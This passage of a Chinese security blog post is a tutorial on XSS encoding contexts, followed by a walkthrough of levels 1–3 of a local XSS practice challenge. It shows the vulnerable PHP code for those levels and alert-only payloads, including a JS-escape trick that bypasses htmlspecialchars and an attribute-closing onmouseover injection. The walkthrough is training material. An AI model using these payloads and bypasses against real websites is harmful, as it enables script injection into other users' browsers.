class="string">'name'</span>] == <span class="string">''</span>)&#123;</span><br><span class="line">  		$isempty = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$value = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$html = <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">$html .= <span class="string">"Your Name is :</span></span><br><span class="line"><span class="string">      &lt;div id='a'&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;script&gt;</span></span><br><span class="line"><span class="string">          document.getElementById('a').innerHTML= "</span>.<span class="string">"'"</span>.htmlspecialchars($value).<span class="string">"'"</span>.<span class="string">";</span></span><br><span class="line"><span class="string">      &lt;/script&gt;</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">$html .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> @$html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>这里我们先分析value的环境，通过url参入参数，在script内，先进行js解码，然后写入html内进行html解码<br>于是考虑将payload进行js解码，此时便可以绕过html的实体编码</p>
+<p>如果我们输入以往payload，会发现htmlspecialchars函数对value的特殊字符进行了实体编码</p>
+<pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>Your Name is :</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'a'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">          document.getElementById('a').innerHTML= '&amp;lt;img src=x onerror=alert(1)&amp;gt;';</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>于是我们构造payload，对url传入的参数先进行js编码</p>
+<p>\x3cimg src=x onerror=alert(1)\3e</p>
+<p>从而绕过服务端对特殊字符的编码，在浏览器中先进行js解码，然后进行html解码，从而执行</p>
+<p><img src="https://i.imgur.com/IOB8atM.png" alt></p>
+<p>通过以上两个案例，我们对XSS的解码环境有了一个简单了解，以后在防御或者绕过XSS的时候，都可以做到在正确的环境内使用适当的编码</p>
+<blockquote>
+<p>很多不了解html、js编码的童鞋挖掘xss漏洞时，都是一顿乱插，姿势对了，就能获得快感，姿势不对，就么反应</p>
+</blockquote>
+<h1 id="XSS过关挑战"><a href="#XSS过关挑战" class="headerlink" title="XSS过关挑战"></a>XSS过关挑战</h1><p>说了这么多，我已经迫不及待想找个留言板，输入框进行XSS测试了怎么办？</p>
+<p>下面有个XSS过关挑战，从Level1到Level20，这里我们一起看一下前三关。</p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://i.imgur.com/5woWTXz.png" alt></p>
+<p><a href="http://127.0.0.1/xss/level1.php?name=test" target="_blank" rel="noopener">http://127.0.0.1/xss/level1.php?name=test</a></p>
+<p>这里我们给name参数传入&lt;img src=x onerror=alert(1)&gt; 从而成功过关</p>
+<p>此时看下第一关的服务端代码：</p>
+<pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.alert = function()  </span></span><br><span class="line"><span class="undefined">&#123;     </span></span><br><span class="line"><span class="undefined">confirm("完成的不错！");</span></span><br><span class="line"><span class="undefined"> window.location.href="level2.php?keyword=test"; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>发现并没有对name参数进行过滤编码等，从而用最简单的payload可以弹窗</p>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://i.imgur.com/Z43PNXg.png" alt></p>
+<p>如法炮制，利用第一关payload发现，并没有执行弹窗，于是查看网页源码：</p>
+<pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.alert = function()  </span></span><br><span class="line"><span class="undefined">&#123;     </span></span><br><span class="line"><span class="undefined">confirm("完成的不错！");</span></span><br><span class="line"><span class="undefined"> window.location.href="level3.php?writing=wait"; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"搜索"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:28<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>发现value值需要进行闭合操作</p>
+<p>于是构造payload如下：”&gt;&lt;img src=x onerror=alert(1)&gt;&lt;”  成功执行</p>
+<p><img src="https://i.imgur.com/oH7EA9j.png" alt></p>
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://i.imgur.com/Q25dZyL.png" alt></p>
+<p>输入构造的payload，查看网页源代码发现进行了html实体编码</p>
+<pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.alert = function()  </span></span><br><span class="line"><span class="undefined">&#123;     </span></span><br><span class="line"><span class="undefined">confirm("完成的不错！");</span></span><br><span class="line"><span class="undefined"> window.location.href="level4.php?keyword=try harder!"; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level3.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'&amp;lt;img src=x onerror=alert(1)&amp;gt;'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:28<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>于是考虑利用on事件来触发弹窗，闭合后payload如下：</p>
+<p>‘onmouseover=’alert(1)’ 通过鼠标移动事件来执行弹窗操作</p>
+<p><img src="https://i.imgur.com/9wAjDOv.png" alt></p>
+<p>做完之后我们再看下服务端的代码如下：</p>
+<pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.alert = function()  </span></span><br><span class="line"><span class="undefined">&#123;     </span></span><br><span class="line"><span class="undefined">confirm("完成的不错！");</span></span><br><span class="line"><span class="undefined"> window.location.href="level4.php?keyword=try harder!"; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">"keyword"</span>];</span></span><br><span class="line">echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;"."&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value='".htmlspecialchars($str)."'&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="php">&lt;/center&gt;<span class="string">";</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>这里利用php的htmlspecialchars函数对传入参数进行实体编码，这个参数有一个特性就是默认的如果不指定的话，并不会对’进行编码，只对”进行编码，于是可以构造闭合标签。另外关于XSS的挑战还有很多，感兴趣的童鞋可以下载源码搭环境进行测试。</p>
+<p>链接: <a href="https://pan.baidu.com/s/1jmZprsR4_EzePinRUodutg" target="_blank" rel="noopener">https://pan.baidu.com/s/1jmZprsR4_EzePinRUodutg</a> 密码: 2cep</p>
+<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>本文只是从个人角度对XSS进行简单介绍，并未对XSS进行深入研究。XSS对于Web前端安全来说，显得尤为重要，不论是各种新奇的配合利用，还是各种姿势的bypass，都值得去探索。</p>
+<p>Web安全之XSS是前端安全重要的一环，需要引起足够的重视。XSS运用灵活，姿势多变，配合CSRF等漏洞，可能产生不一样的效果。</p>
+
+      
+    </div>
+    
+    
+    
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	
+	</div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="Cc丶MySunshine 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
+          
+            <a href="/tags/Web渗透/" rel="tag"><i class="fa fa-tag"></i> Web渗透</a>
+          
+            <a href="/tags/编码/" rel="tag"><i class="fa fa-tag"></i> 编码</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/12/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/13/爬虫漏洞监控/" rel="prev" title="Python爬虫最新漏洞监控实现定时邮件推送和可视化">
+                Python爬虫最新漏洞监控实现定时邮件推送和可视化 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Cc丶MySunshine">
+            
+              <p class="site-author-name" itemprop="name">Cc丶MySunshine</p>
+              <p class="site-description motion-element" itemprop="description">The one who wants to wear the crown must bear the weight</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS简介"><span class="nav-number">2.</span> <span class="nav-text">XSS简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞的危害"><span class="nav-number">3.</span> <span class="nav-text">XSS漏洞的危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS漏洞的类型"><span class="nav-number">4.</span> <span class="nav-text">XSS漏洞的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型XSS"><span class="nav-number">4.1.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型XSS"><span class="nav-number">4.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">4.3.</span> <span class="nav-text">DOM XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码一"><span class="nav-number">4.3.1.</span> <span class="nav-text">代码一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码二"><span class="nav-number">4.3.2.</span> <span class="nav-text">代码二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS的防御"><span class="nav-number">5.</span> <span class="nav-text">XSS的防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS的编码问题"><span class="nav-number">6.</span> <span class="nav-text">XSS的编码问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#案例一：HTML——JS"><span class="nav-number">6.1.</span> <span class="nav-text">案例一：HTML——JS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#案例二：JS——HTML"><span class="nav-number">6.2.</span> <span class="nav-text">案例二：JS——HTML</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS过关挑战"><span class="nav-number">7.</span> <span class="nav-text">XSS过关挑战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1"><span class="nav-number">7.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2"><span class="nav-number">7.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3"><span class="nav-number">7.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结束语"><span class="nav-number">8.</span> <span class="nav-text">结束语</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cc丶MySunshine</span>
+
+  
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
